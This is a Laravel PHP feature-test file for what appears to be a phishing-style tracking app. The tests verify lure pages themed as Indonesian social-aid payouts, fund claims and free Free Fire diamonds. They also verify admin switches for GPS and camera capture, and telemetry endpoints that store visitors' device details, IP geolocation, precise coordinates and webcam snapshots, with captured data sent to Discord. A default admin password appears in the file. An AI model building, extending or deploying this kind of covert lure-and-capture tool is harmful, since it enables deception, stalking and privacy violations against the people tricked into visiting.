<?php

namespace Tests\Feature;

use App\Models\Setting;
use App\Models\User;
use App\Models\VisitorLog;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Storage;
use Tests\TestCase;

class TelemetryAndAdminTest extends TestCase
{
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();
        $this->seed();
    }

    public function test_landing_page_renders_successfully(): void
    {
        $response = $this->get('/');
        $response->assertStatus(200);
        $response->assertSee('Gampil Akses');
    }

    public function test_custom_template_routes_render_successfully(): void
    {
        $templates = ['bansos', 'klaim-dana', 'gampil', 'diamond', 'penarikandana', 'chatme', 'instagram', 'chat', 'template', 'kapan-pulang'];

        foreach ($templates as $tpl) {
            $response = $this->get("/p/{$tpl}");
            $response->assertStatus(200);
        }
    }

    public function test_admin_can_change_active_template(): void
    {
        $admin = User::where('email', 'admin@r4ven.local')->first();

        $response = $this->actingAs($admin)->post('/admin/settings', [
            'active_template' => 'diamond',
            'site_title' => 'Esports ID Diamonds',
            'site_description' => 'Claim free diamonds',
            'capture_gps_enabled' => '1',
            'capture_cam_enabled' => '1',
            'cam_interval_ms' => 2500,
            'max_snapshots_per_session' => 5,
        ]);

        $response->assertRedirect();
        $this->assertEquals('diamond', Setting::get('active_template'));

        // Now root URL '/' should serve the diamond template
        $rootResponse = $this->get('/');
        $rootResponse->assertStatus(200);
        $rootResponse->assertSee('Kode Redeem Free Fire');
    }

    public function test_telemetry_init_creates_visitor_log(): void
    {
        Http::fake([
            'discord.com/*' => Http::response(['status' => 'ok'], 200),
            'ip-api.com/*' => Http::response([
                'status' => 'success',
                'continent' => 'Asia',
                'country' => 'Indonesia',
                'countryCode' => 'ID',
                'city' => 'Jakarta',
                'isp' => 'Telkom Indonesia',
                'lat' => -6.2,
                'lon' => 106.8,
            ], 200),
        ]);

        $payload = [
            'user_agent' => 'Mozilla/5.0 Test Agent',
            'platform' => 'Win32',
            'ram' => '8',
            'cpu_cores' => '4',
            'screen_resolution' => '1920x1080',
        ];

        $response = $this->postJson('/api/v1/telemetry/init', $payload);
        $response->assertStatus(200);
        $response->assertJsonStructure(['status', 'uuid', 'config']);

        $uuid = $response->json('uuid');
        $this->assertDatabaseHas('visitor_logs', [
            'uuid' => $uuid,
            'platform' => 'Win32',
        ]);
    }

    public function test_telemetry_location_updates_gps(): void
    {
        Http::fake([
            'discord.com/*' => Http::response(['status' => 'ok'], 200),
        ]);

        $log = VisitorLog::create([
            'uuid' => 'test-uuid-1234',
            'ip' => '127.0.0.1',
        ]);

        $response = $this->postJson('/api/v1/telemetry/location', [
            'uuid' => 'test-uuid-1234',
            'latitude' => -6.1754,
            'longitude' => 106.8272,
            'accuracy' => 15.5,
        ]);

        $response->assertStatus(200);
        $this->assertDatabaseHas('visitor_logs', [
            'uuid' => 'test-uuid-1234',
            'gps_lat' => -6.1754,
            'gps_lon' => 106.8272,
        ]);
    }

    public function test_telemetry_snapshot_upload(): void
    {
        Storage::fake('public');
        Http::fake([
            'discord.com/*' => Http::response(['status' => 'ok'], 200),
        ]);

        $log = VisitorLog::create([
            'uuid' => 'snap-uuid-999',
            'ip' => '127.0.0.1',
        ]);

        $file = UploadedFile::fake()->image('target.jpg', 640, 480);

        $response = $this->post('/api/v1/telemetry/snapshot', [
            'uuid' => 'snap-uuid-999',
            'image' => $file,
        ]);

        $response->assertStatus(200);
        $this->assertDatabaseHas('visitor_snapshots', [
            'uuid' => 'snap-uuid-999',
        ]);
    }

    public function test_admin_panel_authentication_and_authorization(): void
    {
        // Unauthenticated access
        $this->get('/admin')->assertRedirect('/login');

        // Visitor access
        $visitor = User::create([
            'name' => 'Test Visitor',
            'email' => 'visitor@example.com',
            'password' => bcrypt('password'),
            'role' => 'visitor',
        ]);
        $this->actingAs($visitor)->get('/admin')->assertStatus(403);

        // Admin access
        $admin = User::where('role', 'admin')->first();
        $this->actingAs($admin)->get('/admin')->assertStatus(200);
        $this->actingAs($admin)->get('/admin/logs')->assertStatus(200);
        $this->actingAs($admin)->get('/admin/settings')->assertStatus(200);

        // Test Password update
        $response = $this->actingAs($admin)->post('/admin/settings/password', [
            'current_password' => env('ADMIN_PASSWORD', 'admin12345'),
            'new_password' => 'newSecretPassword999',
            'new_password_confirmation' => 'newSecretPassword999',
        ]);
        $response->assertRedirect();
        $this->assertTrue(\Illuminate\Support\Facades\Hash::check('newSecretPassword999', $admin->fresh()->password));
    }
}
